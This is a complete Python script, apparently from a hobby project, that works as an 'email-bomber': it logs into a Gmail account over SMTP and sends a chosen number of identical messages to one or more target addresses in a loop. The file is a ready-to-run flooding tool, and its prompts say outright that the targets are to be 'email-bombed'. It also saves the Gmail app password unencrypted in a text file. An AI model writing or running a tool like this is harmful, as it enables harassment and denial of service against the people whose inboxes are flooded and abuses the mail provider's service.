# Built-in libraries
import smtplib
import getpass
from os import access, path, mkdir
from email.message import EmailMessage

# Welcomes user
print(f"{open('Welcome/welcome.txt', encoding='UTF-8').read()}\n\n")

# User inputs
if not path.exists("User_Credentials"):
    # If User_Credentials does not exist, asks for user credentials
    sender = input("Enter the Gmail address you would like to send emails from (example@gmail.com) -> ")
    app_password = getpass.getpass("Enter the app's password (xxxx xxxx xxxx xxxx) -> ")
else:
    # Otherwise, reads saved user credentials
    sender = open("User_Credentials/sender.txt", "rt").read()
    app_password = open("User_Credentials/app_password.txt", "rt").read()

print("If you would like to spam more than one email, separate the emails by commas (example@gmail.com, example2@hotmail.com, example3@myspace.com)")

# Enter the email(s) that you would like to email-bomb
receiver = input("Specify the email(s) you would like to email-bomb -> ")

# Enter the subject for the emails
subject = input("Enter the subject for your email-bomber message -> ")

# Enter the message that the email user(s) will receive
msg = input("Enter your email-bomber message -> ")

message = EmailMessage()
message.set_content(msg, subtype="plain", charset='us-ascii')
message["Subject"] = subject  # Set the subject for the email

# Loop until a valid count value is given
while True:
    try:
        count = int(input("Enter a number for the amount of emails to be sent -> "))
    except ValueError:
        print("Please enter an integer for the amount of emails to be sent.")
    except KeyboardInterrupt:
        print("Goodbye!")
        quit()

    if count <= 0:
        print("Count must be positive. Received", count)
        continue
    break

# Server
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()

# Attempts to log in to the user's Gmail account
try:
    server.login(user=sender, password=app_password)
except smtplib.SMTPAuthenticationError as error:
    print("\nError: Make sure the Gmail address that you inputted is the same as the Gmail account you have created an app password for.\nAlso, double-check your Gmail and app password.")
    print(f"{error}")
    input("Enter to exit...")
    quit()

try:
    if not path.exists("User_Credentials"):
        # If user credentials do not exist, create and save credential files
        # If there are no errors in credentials, save user information after SMTP verification
        mkdir("User_Credentials")
        open("User_Credentials/sender.txt", "xt").write(sender)
        open("User_Credentials/app_password.txt", "xt").write(app_password)
        input("\nYour credentials have been saved, so you do not have to repeat this process.\nTo change your credentials, go to User_Credentials and change your file information.\nPress enter to continue...")
except OSError:
    print("\nError: There was an error saving your credentials.")

print("\nEmail-bomber has started...\n")

for i in range(count):
    # Amount of messages to be sent
    for email_receiver in receiver.split(","):
        # Loops through emails to send emails to
        try:
            print(f"Email-bombing {email_receiver}...")
            server.sendmail(from_addr=sender, to_addrs=email_receiver, msg=message.as_string())
            print("Email sent successfully!")
        except smtplib.SMTPException as error:
            print(f"Error: {error}")
            continue

input("\nEmail-bomber was successful...\nPress enter to exit...")
server.close()
